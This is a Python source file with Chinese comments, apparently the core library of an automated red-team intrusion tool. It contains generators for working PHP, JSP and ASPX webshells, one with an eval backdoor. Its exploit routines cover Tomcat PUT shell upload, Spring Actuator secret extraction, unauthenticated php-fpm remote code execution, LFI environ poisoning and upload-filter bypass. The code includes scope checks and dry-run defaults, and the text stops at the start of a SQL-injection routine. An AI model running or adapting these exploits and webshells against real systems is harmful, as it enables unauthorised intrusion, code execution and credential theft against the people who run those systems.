#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""chainlib — 自动入侵链路核心库（纯标准库，无第三方依赖）。

组成：
  - HTTP 客户端（强制绕过系统代理，Windows 注册表代理陷阱免疫）
  - TCP 最小协议客户端：RESP(Redis) / FastCGI(PHP-FPM) / MongoDB OP_MSG / memcached
  - WebShell 命令通道（contract: POST k=<key>&c=base64(cmd) → 响应原文 stdout）
  - 15 个攻击原语（probe/exploit/verify 三段），阶段化状态机
  - 证据落盘 + JSONL 台账（字段兼容 ARTEX redteam_chain_add 语义）

设计约束（对应 chains-meta / chains-web 铁律）：
  - 一切观测必须带阴性/阳性对照，200 不等于打通
  - probe 只读；exploit 需 --execute 且通过范围护栏；verify 必须双对照复现
  - 命门在手先收口：foothold 成立后立即转 post-enum，不再发散
"""
from __future__ import annotations

import base64
import hmac
import hashlib
import html as _html
import http.client
import ipaddress
import json
import os
import random
import re
import socket
import ssl
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass, field, asdict

__version__ = "0.1.0"
CRLF = b"\r\n"
MARK = "artex-chain-" + uuid.uuid4().hex[:12]  # 每次运行一次性标记

# ---------------------------------------------------------------------------
# 范围护栏
# ---------------------------------------------------------------------------
FORBIDDEN_HOSTS = {"169.254.169.254"}  # 云元数据，红线，永不放行


class ScopeError(RuntimeError):
    pass


class Scope:
    def __init__(self, allow: list[str] | None):
        self.allow = []
        for item in allow or []:
            if "/" in item:
                self.allow.append(ipaddress.ip_network(item, strict=False))
            else:
                try:
                    self.allow.append(ipaddress.ip_address(item))
                except ValueError:
                    self.allow.append(("host", item.lower()))

    def _host_allowed(self, host: str) -> bool:
        h = host.lower()
        try:
            ip = ipaddress.ip_address(h)
        except ValueError:
            ip = None
        for entry in self.allow:
            if isinstance(entry, tuple):
                if entry[1] == h:
                    return True
            elif isinstance(entry, ipaddress.IPv4Network | ipaddress.IPv6Network):
                if ip is not None and ip in entry:
                    return True
            elif isinstance(entry, ipaddress.IPv4Address | ipaddress.IPv6Address):
                if ip is not None and entry == ip:
                    return True
            elif str(entry) == h:
                return True
        return False

    def check(self, host: str) -> None:
        if not self.allow:
            raise ScopeError("范围护栏未开启：必须用 --allow 显式圈定目标（IP/CIDR/域名）后才允许执行")
        h = host.split(":")[0].strip("[]").lower()
        if h in FORBIDDEN_HOSTS:
            raise ScopeError(f"{host} 命中云元数据红线，任何情况下都不放行")
        if not self._host_allowed(h):
            raise ScopeError(f"{host} 不在授权清单内（--allow）")


# ---------------------------------------------------------------------------
# HTTP 客户端：绕过系统代理（Windows python urllib 会读注册表代理导致假超时）
# ---------------------------------------------------------------------------
class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # 不自动跟随 3xx：重定向落点必须先过范围护栏


_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), _NoRedirect)
_opener.addheaders = [("User-Agent", "Mozilla/5.0 (compatible; chainctl/1)")]
_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


@dataclass
class Resp:
    status: int
    headers: dict
    body: bytes
    elapsed: float

    def text(self) -> str:
        return self.body.decode("utf-8", "replace")


def http_req(method: str, url: str, headers: dict | None = None,
             data: bytes | None = None, timeout: float = 10.0) -> Resp:
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    t0 = time.time()
    try:
        with _opener.open(req, timeout=timeout) as r:
            return Resp(r.status, {k.lower(): v for k, v in r.headers.items()},
                        r.read(), time.time() - t0)
    except urllib.error.HTTPError as e:
        return Resp(e.code, {k.lower(): v for k, v in e.headers.items()},
                    e.read(), time.time() - t0)


def http_json(method: str, url: str, body: dict | None = None, timeout: float = 10.0,
              headers: dict | None = None) -> Resp:
    data = json.dumps(body).encode() if body is not None else None
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    return http_req(method, url, h, data, timeout)


def parse_url(url: str):
    u = urllib.parse.urlparse(url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    return u.scheme, host, port, u.path or "/"


def title_of(body: bytes) -> str:
    m = re.search(rb"<title[^>]*>(.*?)</title>", body, re.S | re.I)
    if not m:
        return ""
    return _html.unescape(m.group(1).decode("utf-8", "replace")).strip()


def multipart_body(field: str, filename: str, content: bytes,
                   extra_fields: dict | None = None) -> tuple[bytes, str]:
    b = "----artex" + uuid.uuid4().hex
    out = []
    for k, v in (extra_fields or {}).items():
        out.append(f"--{b}{CRLF.decode()}Content-Disposition: form-data; name=\"{k}\"{CRLF.decode()}{CRLF.decode()}{v}{CRLF.decode()}")
    out.append(f"--{b}{CRLF.decode()}Content-Disposition: form-data; name=\"{field}\"; filename=\"{filename}\"{CRLF.decode()}"
               f"Content-Type: application/octet-stream{CRLF.decode()}{CRLF.decode()}")
    head = "".join(out).encode("utf-8")
    tail = f"{CRLF.decode()}--{b}--{CRLF.decode()}".encode("utf-8")
    return head + content + tail, f"multipart/form-data; boundary={b}"


# ---------------------------------------------------------------------------
# 原始 TCP 客户端
# ---------------------------------------------------------------------------
def tcp_roundtrip(host: str, port: int, payload: bytes, timeout: float = 5.0,
                  read_wait: float = 0.8) -> bytes:
    """连接-发送-读尽。对一次性协议足够。"""
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        if payload:
            s.sendall(payload)
        buf = b""
        s.settimeout(read_wait)
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf


# --- RESP (Redis) -----------------------------------------------------------
def redis_encode(*args: str | bytes) -> bytes:
    out = [b"*" + str(len(args)).encode() + CRLF]
    for a in args:
        b = a.encode() if isinstance(a, str) else a
        out.append(b"$" + str(len(b)).encode() + CRLF + b + CRLF)
    return b"".join(out)


def redis_read(f) -> object:
    line = f.readline()
    if not line:
        raise EOFError("redis: empty reply")
    t, rest = line[:1], line[1:].strip()
    if t == b"+":
        return rest.decode()
    if t == b"-":
        return Exception(rest.decode())
    if t == b":":
        return int(rest)
    if t == b"$":
        n = int(rest)
        if n == -1:
            return None
        data = f.read(n + 2)
        return data[:n].decode("utf-8", "replace")
    if t == b"*":
        n = int(rest)
        return [redis_read(f) for _ in range(n)]
    raise ValueError(f"redis: bad type {t!r}")


def redis_cmd(host: str, port: int, *args: str, timeout: float = 5.0):
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(redis_encode(*args))
        return redis_read(s.makefile("rb"))


# --- memcached ---------------------------------------------------------------
def memcache_stats(host: str, port: int = 11211, timeout: float = 5.0) -> dict:
    raw = tcp_roundtrip(host, port, b"stats\r\nversion\r\n", timeout)
    out = {}
    for line in raw.decode("utf-8", "replace").splitlines():
        if line.startswith("STAT "):
            k, _, v = line[5:].partition(" ")
            out[k] = v
        elif line.startswith("VERSION "):
            out["version"] = line[8:]
    return out


# --- MongoDB OP_MSG + 最小 BSON ----------------------------------------------
class _BSON:
    @staticmethod
    def cstr(s: str) -> bytes:
        return s.encode() + b"\x00"

    @staticmethod
    def encode(doc: dict) -> bytes:
        body = b""
        for k, v in doc.items():
            if isinstance(v, bool):
                body += b"\x08" + _BSON.cstr(k) + (b"\x01" if v else b"\x00")
            elif isinstance(v, int):
                body += b"\x10" + _BSON.cstr(k) + struct.pack("<i", v)
            elif isinstance(v, float):
                body += b"\x01" + _BSON.cstr(k) + struct.pack("<d", v)
            elif isinstance(v, str):
                eb = v.encode() + b"\x00"
                body += b"\x02" + _BSON.cstr(k) + struct.pack("<i", len(eb)) + eb
            elif isinstance(v, dict):
                sub = _BSON.encode(v)
                body += b"\x03" + _BSON.cstr(k) + sub
        total = struct.pack("<i", len(body) + 5) + body + b"\x00"
        return total

    @staticmethod
    def _rd(buf: memoryview, off: int):
        t = buf[off]
        off += 1
        end = buf.obj.find(b"\x00", off)
        name = buf.obj[off:end].decode()
        off = end + 1
        if t == 0x08:
            return name, (buf[off] == 1), off + 1
        if t == 0x10:
            return name, struct.unpack_from("<i", buf.obj, off)[0], off + 4
        if t == 0x01:
            return name, struct.unpack_from("<d", buf.obj, off)[0], off + 8
        if t == 0x02:
            ln = struct.unpack_from("<i", buf.obj, off)[0]
            return (name, buf.obj[off + 4: off + 4 + ln - 1].decode("utf-8", "replace"),
                    off + 4 + ln)
        if t in (0x03, 0x04):
            sub_len = struct.unpack_from("<i", buf.obj, off)[0]
            sub, _ = _BSON._parse(memoryview(buf.obj[off: off + sub_len]))
            return name, sub, off + sub_len
        raise ValueError(f"bson: unsupported type 0x{t:02x}")

    @staticmethod
    def _parse(buf: memoryview):
        total = struct.unpack_from("<i", buf.obj, 0)[0]
        off = 4
        doc: dict = {}
        while off < total - 1:
            name, val, off = _BSON._rd(buf, off)
            doc[name] = val
        return doc, total


def mongo_op_msg(host: str, port: int, doc: dict, db: str = "admin",
                 timeout: float = 5.0) -> dict:
    """发送 OP_MSG(2013) 并解析应答。kind-0 section 的 body 就是 BSON 文档本身，
    没有 db.$cmd 集合名——那是 OP_QUERY(2004) 的语义。"""
    body = _BSON.encode(doc)
    payload = struct.pack("<i", 0) + b"\x00" + body  # flagBits=0, kind=0, body
    total = 16 + len(payload)
    hdr = struct.pack("<iiii", total, 0, 0, 2013)
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(hdr + payload)
        head = b""
        while len(head) < 16:
            chunk = s.recv(16 - len(head))
            if not chunk:
                raise EOFError("mongo: 对端在读头时关闭连接")
            head += chunk
        length, _req, _resp, _op = struct.unpack("<iiii", head)
        if length < 16 or _op != 2013:
            raise ValueError(f"mongo: 非法应答 op={_op} len={length}")
        rest = b""
        while len(rest) < length - 16:
            chunk = s.recv(length - 16 - len(rest))
            if not chunk:
                raise EOFError("mongo: 对端在读体时关闭连接")
            rest += chunk
    flag = struct.unpack_from("<i", rest, 0)[0]
    kind = rest[4]
    if kind != 0:
        raise ValueError(f"mongo: 不支持的 section kind={kind}")
    doc_bytes = rest[5:]
    dlen = struct.unpack_from("<i", doc_bytes, 0)[0]
    parsed, _ = _BSON._parse(memoryview(doc_bytes[:dlen]))
    parsed["_flag"] = flag
    return parsed


# --- FastCGI -----------------------------------------------------------------
FCGI_BEGIN = 1
FCGI_END = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 6
FCGI_STDERR = 7


def _fcgi_rec(rid: int, rtype: int, body: bytes) -> bytes:
    pad = b"\x00" * ((8 - len(body) % 8) % 8)
    # 标准 8 字节 FCGI 头: version(1) type(1) requestId(2) contentLength(2) paddingLength(1) reserved(1)
    return struct.pack(">BBHHBB", 1, rtype, rid, len(body), len(pad), 0) + body + pad


def _fcgi_pairs(pairs: list[tuple[bytes, bytes]]) -> bytes:
    out = b""
    for k, v in pairs:
        for val in (k, v):
            n = len(val)
            if n < 128:
                out += bytes([n])
            else:
                out += struct.pack(">I", n | 0x80000000)
        out += k + v
    return out


def fcgi_call(host: str, port: int, params: list[tuple[str, str]],
              stdin: bytes = b"", timeout: float = 6.0) -> tuple[bytes, bytes]:
    """最小 FastCGI responder 调用，返回 (stdout, stderr)。"""
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(_fcgi_rec(1, FCGI_BEGIN, struct.pack(">HBxxxxx", 1, 0)))
        s.sendall(_fcgi_rec(1, FCGI_PARAMS, _fcgi_pairs([(k.encode(), v.encode()) for k, v in params])))
        s.sendall(_fcgi_rec(1, FCGI_PARAMS, b""))
        if stdin:
            s.sendall(_fcgi_rec(1, FCGI_STDIN, stdin))
        s.sendall(_fcgi_rec(1, FCGI_STDIN, b""))
        out, err = b"", b""
        buf = b""
        while True:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            while len(buf) >= 8:
                _v, rtype, rid, clen, plen, _res = struct.unpack(">BBHHBB", buf[:8])
                if len(buf) < 8 + clen + plen:
                    break
                body = buf[8:8 + clen]
                buf = buf[8 + clen + plen:]
                if rid != 1:
                    continue
                if rtype == FCGI_STDOUT:
                    out += body
                elif rtype == FCGI_STDERR:
                    err += body
                elif rtype == FCGI_END:
                    return out, err
        return out, err


# ---------------------------------------------------------------------------
# WebShell 命令通道（contract：POST k=<key>&c=b64(cmd) → 响应=stdout 原文）
# ---------------------------------------------------------------------------
class ShellChannel:
    def __init__(self, url: str, key: str, timeout: float = 15.0):
        self.url = url
        self.key = key
        self.timeout = timeout

    def exec(self, cmd: str) -> tuple[bool, str]:
        body = urllib.parse.urlencode({"k": self.key, "c": base64.b64encode(cmd.encode()).decode()}).encode()
        r = http_req("POST", self.url, {"Content-Type": "application/x-www-form-urlencoded"}, body, self.timeout)
        out = r.body.decode("utf-8", "replace").strip()
        if r.status != 200 or not out:
            return False, out or f"HTTP {r.status}"
        return True, out


def scaffold(kind: str = "php", key: str = "artex") -> str:
    """生成与 ShellChannel contract 匹配的马（交付必须可实测连接）。"""
    if kind == "php":
        return ("<?php error_reporting(0);"
                "if(isset($_POST['k'])&&$_POST['k']==='%s'){"
                "$c=base64_decode($_POST['c']??'');"
                "$o=@shell_exec($c.' 2>&1');"
                "header('Content-Type:text/plain');echo $o;exit;}"
                "@eval($_POST['e']??null);?>" % key)
    if kind == "jsp":
        return ("<%@ page import=\"java.util.*,java.io.*\" %><% "
                "if(request.getParameter(\"k\")!=null&&request.getParameter(\"k\").equals(\"" + key + "\")){"
                "String c=new String(java.util.Base64.getDecoder().decode(request.getParameter(\"c\")));"
                "Process p=Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c});"
                "BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));"
                "String l,out=\"\";while((l=r.readLine())!=null){out+=l+\"\\n\";}"
                "response.setContentType(\"text/plain\");out.write(out.getBytes());return;} %>")
    if kind == "aspx":
        return ("<%@ Page Language=\"C#\" %><% "
                "if(Request[\"k\"]==\"" + key + "\"){"
                "var c=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Request[\"c\"]??\"\"));"
                "var p=new System.Diagnostics.Process();p.StartInfo.FileName=\"/bin/sh\";"
                "p.StartInfo.Arguments=\"-c \\\"\"+c+\"\\\"\";p.StartInfo.RedirectStandardOutput=true;"
                "p.StartInfo.UseShellExecute=false;p.Start();"
                "Response.ContentType=\"text/plain\";Response.Write(p.StandardOutput.ReadToEnd());} %>")
    raise ValueError(kind)


# ---------------------------------------------------------------------------
# 观测 / 台账 / 证据
# ---------------------------------------------------------------------------
@dataclass
class Obs:
    ok: bool = False
    detail: str = ""
    evidence: dict = field(default_factory=dict)
    gained: str = ""          # db-access / file-write / shell-channel / root-container ...
    next_steps: list = field(default_factory=list)


@dataclass
class Ctx:
    target: str               # scheme://host:port
    host: str
    port: int
    allow: Scope
    run_dir: str
    dry_run: bool = True
    execute: bool = False
    hints: dict = field(default_factory=dict)   # 指纹与 CLI 附加参数
    ledger_path: str = ""
    rps: float = 5.0
    _last: float = 0.0

    def base(self) -> str:
        return self.target.rstrip("/")

    def url(self, path: str) -> str:
        return self.base() + "/" + path.lstrip("/")

    def throttle(self) -> None:
        now = time.time()
        wait = (1.0 / self.rps) - (now - self._last)
        if wait > 0:
            time.sleep(wait)
        self._last = time.time()

    def req(self, method: str, path_or_url: str, headers: dict | None = None,
            data: bytes | None = None, timeout: float = 10.0) -> Resp:
        url = path_or_url if path_or_url.startswith("http") else self.url(path_or_url)
        scheme, host, _port, _path = parse_url(url)
        if scheme in ("http", "https"):
            # 逐请求护栏：绝对 URL（SSRF/重定向落点）不得越过 --allow 与元数据红线
            self.allow.check(host)
        self.throttle()
        return http_req(method, url, headers, data, timeout)

    def save(self, name: str, data) -> str:
        os.makedirs(self.run_dir, exist_ok=True)
        p = os.path.join(self.run_dir, re.sub(r"[^A-Za-z0-9._-]", "_", name))
        if isinstance(data, (dict, list)):
            with open(p, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        else:
            if isinstance(data, str):
                data = data.encode()
            with open(p, "wb") as f:
                f.write(data)
        return p

    def log(self, primitive: str, stage: str, action: str, obs: Obs,
            target: str | None = None, severity: str = "info") -> dict:
        rec = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "primitive": primitive, "stage": stage, "action": action,
            "target": target or self.target,
            "ok": obs.ok, "detail": obs.detail, "gained": obs.gained,
            "severity": severity if obs.ok else "none",
            "evidence": obs.evidence,
        }
        os.makedirs(os.path.dirname(self.ledger_path), exist_ok=True)
        with open(self.ledger_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        return rec


# ---------------------------------------------------------------------------
# 原语注册表：每个原语 meta + probe/exploit/verify
# ---------------------------------------------------------------------------
PRIMITIVES: dict[str, dict] = {}


def primitive(pid: str, stage: str, kind: str, severity: str,
              requires: list[str] | None = None, products: list[str] | None = None,
              ports: list[int] | None = None, refs: list[str] | None = None):
    def deco(fn):
        PRIMITIVES[pid] = {
            "id": pid, "stage": stage, "kind": kind, "severity": severity,
            "requires": requires or [], "products": products or [],
            "ports": ports or [], "refs": refs or [], "fn": fn,
        }
        return fn
    return deco


# --- entry: HTTP 指纹 --------------------------------------------------------
@primitive("http-fingerprint", "entry", "http", "info")
def http_fingerprint(ctx: Ctx, step: str) -> Obs:
    try:
        r = ctx.req("GET", "/")
    except Exception as e:
        # 连接失败/超时记干净判否，而非引擎 error
        return Obs(False, f"请求失败：{type(e).__name__}: {e}")
    hdr = {"server": r.headers.get("server", ""), "x-powered-by": r.headers.get("x-powered-by", ""),
           "title": title_of(r.body)}
    ctx.hints.setdefault("fingerprint", hdr)
    if r.status < 500:
        return Obs(True, f"HTTP {r.status} server={hdr['server'] or '?'} title={hdr['title'][:40]!r}",
                   {"headers": hdr, "len": len(r.body)})
    return Obs(False, f"HTTP {r.status}")


# --- exploit: Tomcat PUT ------------------------------------------------------
@primitive("tomcat-put", "exploit", "http", "critical", ports=[8080, 80, 443], products=["tomcat"])
def tomcat_put(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    opt = ctx.req("OPTIONS", "/")
    allow = opt.headers.get("allow", "")
    if step == "probe":
        # probe 纯只读：绝不发 PUT（原实现即使 dry-run 也会在目标写 .jsp）
        if opt.status not in (200, 204, 301, 302, 404):
            return Obs(False, f"OPTIONS 异常 {opt.status}")
        if "PUT" not in allow.upper():
            return Obs(False, f"无 PUT 方法 (Allow={allow or '无'})")
        return Obs(True, "OPTIONS Allow 含 PUT（写入能力留给 exploit 实测）", {"allow": allow})
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过真实写入")
        name = "shell_" + uuid.uuid4().hex[:8] + ".jsp"
        body = scaffold("jsp").encode()
        r = ctx.req("PUT", f"/{name}", {"Content-Type": "application/octet-stream"}, body)
        if r.status not in (200, 201, 204):
            return Obs(False, f"PUT 被拒 {r.status}", {"allow": allow})
        # 200/201/204 也可能是 WAF 伪造；唯一可信判据是通道实测
        ch = ShellChannel(ctx.url(f"/{name}"), "artex")
        ok, out = ch.exec("id")
        if ok and "uid=" in out:
            ctx.hints["_tomcat_name"] = name
            o.ok = True
            o.detail = f"JSP 落地并实测执行 id：{out.strip()[:60]}"
            o.gained = "shell-channel"
            o.evidence = {"shell_url": ctx.url(f"/{name}"), "id": out.strip(), "put_status": r.status}
            o.next_steps = ["redteam_webshell_add", "post-unix-enum"]
        else:
            ctx.hints["_tomcat_name"] = ""
            ctx.req("DELETE", f"/{name}")  # 未取得落点即回滚
            o.ok = False
            o.detail = f"PUT {r.status} 但通道无执行语义（已回滚）：{out[:80]}"
        return o
    if step == "verify":
        name = ctx.hints.get("_tomcat_name") or ""
        if not name:
            return Obs(False, "无可测落点")
        ch = ShellChannel(ctx.url(f"/{name}"), "artex")
        ok, out = ch.exec("echo " + MARK)
        neg = ctx.req("GET", f"/{uuid.uuid4().hex}.jsp")
        bad = ShellChannel(ctx.url(f"/{name}"), "artex-wrong-key")
        bok, _b = bad.exec("echo " + MARK)
        o.ok = bool(ok and MARK in out and neg.status == 404 and not bok)
        o.detail = (f"通道复测={'通' if ok else '断'} 404对照={neg.status} "
                    f"错key对照={'拒绝' if not bok else '放行'}")
        o.evidence = {"marker": MARK, "neg_status": neg.status, "wrong_key_rejected": not bok}
        return o
    return Obs(False, f"未知 step {step}")


# --- entry/exploit: Spring Actuator ------------------------------------------
@primitive("spring-actuator", "exploit", "http", "high", products=["spring"])
def spring_actuator(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    paths = ["/actuator/env", "/env"]
    if step == "verify":
        neg = ctx.req("GET", "/actuator/__nope__")
        pos = None
        for p in paths:
            r = ctx.req("GET", p)
            if r.status == 200:
                pos = r
        o.ok = pos is not None and neg.status in (401, 404, 403)
        o.detail = f"positive={pos.status if pos else 'none'} negative={neg.status}"
        return o
    if step == "probe":
        for p in paths:
            r = ctx.req("GET", p)
            if r.status == 200 and len(r.body) > 20:
                return Obs(True, f"{p} → 200 len={len(r.body)}", {"path": p})
        return Obs(False, "actuator env 未暴露")
    if step == "exploit":
        for p in paths:
            r = ctx.req("GET", p)
            if r.status != 200:
                continue
            txt = r.text()
            # 兼容两种形态：{"k": "v"} 与 spring env 的 {"k": {"value": "v"}}
            pat = re.findall(r'"([\w.]*(?:password|secret|token|key)[\w.]*)"\s*:\s*'
                             r'(?:\{\s*"value"\s*:\s*)?"([^"\s]{6,})"', txt, re.I)
            pat += re.findall(r'([\w.]*(?:password|secret|token|key)[\w.]*)\s*[:=]\s*([^\s",}]{6,})', txt, re.I)
            pth = ctx.save("actuator-env.json", {"path": p, "secrets": pat, "raw": txt[:8000]})
            if pat:
                o.ok = True
                o.detail = f"{p} 泄露 {len(pat)} 个敏感配置"
                o.gained = "creds"
                o.evidence = {"path": pth, "count": len(pat)}
                o.next_steps = ["redteam_vuln_add(severity=high)", "credential-attack 复用验证"]
                return o
        return Obs(False, "env 可读但未匹配到敏感键")
    return Obs(False, f"未知 step {step}")


# --- exploit: php-fpm 未授权 FastCGI ------------------------------------------
@primitive("php-fpm-unauth", "exploit", "tcp", "critical", ports=[9000, 9001])
def php_fpm_unauth(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    php_file = ctx.hints.get("php_file", "/var/www/html/index.php")
    if step == "probe":
        try:
            out, err = fcgi_call(ctx.host, ctx.port, [
                ("SCRIPT_FILENAME", "/etc/passwd"), ("REQUEST_METHOD", "GET"),
                ("PHP_VALUE", "display_errors=1")], timeout=6)
            blob = (out + err).decode("utf-8", "replace")
            # "SCRIPT_FILENAME" in blob 是死条件（FPM 从不回显参数名），已删除；
            # Primary script unknown 恰恰证明对面是 FPM 协议且脚本路径可控
            if "Primary script unknown" in blob or "root:" in blob:
                return Obs(True, f"FastCGI 未授权响应（{ctx.host}:{ctx.port}）", {"blob": blob[:400]})
            return Obs(False, "端口无 FastCGI 语义")
        except Exception as e:
            return Obs(False, f"FCGI 失败：{e}")
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过 RCE")
        code = f"<?php echo '{MARK}'; system('id 2>&1'); ?>".encode()
        try:
            out, err = fcgi_call(ctx.host, ctx.port, [
                ("SCRIPT_FILENAME", php_file), ("REQUEST_METHOD", "POST"),
                ("PHP_VALUE", "allow_url_include=1"),
                ("PHP_ADMIN_VALUE", "auto_prepend_file=php://input")], stdin=code, timeout=6)
        except Exception as e:
            return Obs(False, f"FCGI 失败：{e}")
        blob = (out + err).decode("utf-8", "replace")
        ctx.save("phpfpm-out.txt", blob)
        if MARK in blob:
            o.ok = True
            o.detail = "php-fpm 未授权 RCE（auto_prepend_file=php://input）"
            o.gained = "shell-channel"
            o.evidence = {"out": blob[:300], "php_file": php_file}
            o.next_steps = ["redteam_vuln_add(critical)", "post-unix-enum"]
        else:
            o.detail = f"未取到标记：{blob[:120]!r}"
        return o
    if step == "verify":
        try:
            out, err = fcgi_call(ctx.host, ctx.port, [
                ("SCRIPT_FILENAME", php_file), ("PHP_VALUE", "allow_url_include=1"),
                ("PHP_ADMIN_VALUE", "auto_prepend_file=php://input")],
                stdin=f"<?php echo '{MARK}-v'; ?>".encode(), timeout=6)
            nout, nerr = fcgi_call(ctx.host, ctx.port, [
                ("SCRIPT_FILENAME", "/nonexistent-" + uuid.uuid4().hex[:6] + ".php")], timeout=6)
        except Exception as e:
            return Obs(False, f"FCGI 失败：{e}")
        pos = (MARK + "-v") in (out + err).decode("utf-8", "replace")
        neg = (MARK + "-v") not in (nout + nerr).decode("utf-8", "replace")
        return Obs(pos and neg, f"阳性={pos} 阴性对照={neg}", {"marker": MARK})
    return Obs(False, f"未知 step {step}")


# --- exploit: LFI + /proc/self/environ 投毒 -----------------------------------
@primitive("lfi-environ-rce", "exploit", "http", "critical",
           requires=["lfi_param"], products=["php"])
def lfi_environ(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    param = ctx.hints.get("lfi_param", "path")
    base_path = ctx.hints.get("lfi_path", "/")  # 真实漏洞路径，不硬编码根路径

    def get(path: str, ua: str) -> Resp:
        return ctx.req("GET", f"{base_path}?{urllib.parse.urlencode({param: path})}",
                       {"User-Agent": ua})

    def executed(blob: str, marker: str) -> bool:
        # /proc/self/environ 永远含 UA 原文：marker 出现 != 代码执行。
        # 三重判据：marker + uid 输出 + PHP 源码未被原样反射
        return marker in blob and "uid=" in blob and "<?php" not in blob

    if step == "probe":
        r = get("/proc/self/environ", "artex-probe")
        if r.status == 200 and (b"HTTP_USER_AGENT" in r.body or b"\x00" in r.body):
            return Obs(True, "environ 可读（LFI 面成立，能否执行由 exploit 实证）")
        return Obs(False, "environ 不可读（或非 PHP/无 LFI）")
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过 RCE")
        poison = f"<?php echo '{MARK}'; system('id 2>&1'); ?>"
        blob = get("/proc/self/environ", poison).text()
        ctx.save("lfi-environ.txt", blob)
        if executed(blob, MARK):
            o.ok = True
            o.detail = "LFI+environ 投毒 RCE（marker + uid 双证，且 PHP 源未反射）"
            o.gained = "shell-channel"
            o.evidence = {"resp": blob[:300]}
            o.next_steps = ["redteam_vuln_add(critical)", "post-unix-enum"]
        else:
            o.detail = ("投毒未命中（反射了 UA 原文而非执行）" if MARK in blob
                        else "投毒未命中（响应无标记）")
        return o
    if step == "verify":
        poison = f"<?php echo '{MARK}-v'; system('id'); ?>"
        pos = executed(get("/proc/self/environ", poison).text(), MARK + "-v")
        neg = MARK + "-v" not in get("/proc/self/environ", "clean-agent").text()
        return Obs(pos and neg, f"阳性={pos} 阴性对照={neg}")
    return Obs(False, f"未知 step {step}")


# --- exploit: 上传绕过矩阵 ------------------------------------------------------
@primitive("upload-bypass", "exploit", "http", "critical",
           requires=["upload_url", "upload_field", "upload_dir_url"])
def upload_bypass(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    up_url = ctx.hints["upload_url"]
    fld = ctx.hints["upload_field"]
    dir_url = ctx.hints["upload_dir_url"]
    strategies = [
        ("semicolon", "shell.php;.jpg"),
        ("phtml", "shell.phtml"),
        ("phar", "shell.phar"),
        ("double-ext", "shell.php.jpg"),
        ("plain", "shell.php"),
    ]
    if step == "probe":
        body, ct = multipart_body(fld, "probe.txt", b"artex-probe")
        r = ctx.req("POST", up_url, {"Content-Type": ct}, body)
        return Obs(r.status in (200, 201), f"上传接口 {up_url} → {r.status}", {"resp": r.text()[:200]})
    if step == "exploit":
        if ctx.dry_run and not ctx.execute:
            return Obs(False, "dry-run：跳过上传")
        payload = scaffold("php").encode()
        for name_mode, fname in strategies:
            body, ct = multipart_body(fld, fname, payload)
            r = ctx.req("POST", up_url, {"Content-Type": ct}, body)
            if r.status not in (200, 201):
                continue
            # 常见存储路径猜解：响应里的 url/path 字段优先
            txt = r.text()
            m = re.search(r'(?:url|path|file)"?\s*[:=]\s*"?([^"\s,}]+\.(?:php|phtml|phar))"?', txt, re.I)
            candidates = []
            if m:
                candidates.append(m.group(1))
            base_name = fname.split(";")[0]
            candidates += [f"uploads/{base_name}", f"upload/{base_name}", base_name]
            for cand in candidates:
                shell_url = urllib.parse.urljoin(ctx.base() + "/", cand.lstrip("/"))
                ch = ShellChannel(shell_url, "artex")
                ok, out = ch.exec("echo " + MARK)
                if ok and MARK in out:
                    ctx.save("upload-shell.json", {"strategy": name_mode, "shell_url": shell_url})
                    ctx.hints["_upload_shell"] = {"shell_url": shell_url, "strategy": name_mode}
                    o.ok = True
                    o.detail = f"上传绕过成功（{name_mode} → {shell_url}）实测执行"
                    o.gained = "shell-channel"
                    o.evidence = {"strategy": name_mode, "shell_url": shell_url}
                    o.next_steps = ["redteam_webshell_add", "post-unix-enum"]
                    return o
        o.detail = "全部绕过策略未取得可执行落点"
        return o
    if step == "verify":
        info = ctx.hints.get("_upload_shell")
        if not info:
            return Obs(False, "无已落地 shell 可复测")
        ch = ShellChannel(info["shell_url"], "artex")
        ok, out = ch.exec("echo verify-" + MARK)
        return Obs(ok and ("verify-" + MARK) in out, f"复测执行={'通过' if ok else '失败'}")
    return Obs(False, f"未知 step {step}")


# --- exploit: SQLi 报错/布尔 oracle --------------------------------------------
@primitive("sqli-oracle", "exploit", "http", "high", requires=["sqli_param"])
def sqli_oracle(ctx: Ctx, step: str) -> Obs:
    o = Obs()
    param = ctx.hints["sqli_param"]
    base_path = ctx.hints.get("sqli_path", "/")  # 真实漏洞路径，不硬编码根路径

    def get(payload: str) -> Resp:
        return ctx.req("GET", f"{base_path}?{urllib.parse.urlencode({param: payload})}")

    if step == "probe":
